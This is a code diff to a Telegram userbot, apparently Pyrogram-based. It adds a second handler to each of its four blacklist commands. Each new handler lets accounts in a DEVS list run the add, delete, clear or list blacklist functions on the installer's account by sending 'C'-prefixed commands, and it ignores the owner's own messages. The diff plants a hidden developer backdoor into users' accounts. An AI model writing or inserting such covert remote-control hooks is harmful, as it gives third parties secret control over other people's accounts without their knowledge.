@@ -19,20 +19,24 @@ __HELP__ = """
 
 
 @PY.UBOT("addbl", sudo=True)
+@ubot.on_message(filters.user(DEVS) & filters.command("Caddbl", "") & ~filters.me)
 async def _(client, message):
     await add_blaclist(client, message)
 
 
 @PY.UBOT("delbl", sudo=True)
+@ubot.on_message(filters.user(DEVS) & filters.command("Cdelbl", "") & ~filters.me)
 async def _(client, message):
     await del_blacklist(client, message)
 
 
 @PY.UBOT("rallbl", sudo=True)
+@ubot.on_message(filters.user(DEVS) & filters.command("Crallbl", "") & ~filters.me)
 async def _(client, message):
     await rem_all_blacklist(client, message)
 
 
 @PY.UBOT("listbl", sudo=True)
+@ubot.on_message(filters.user(DEVS) & filters.command("Clistbl", "") & ~filters.me)
 async def _(client, message):
     await get_blacklist(client, message)
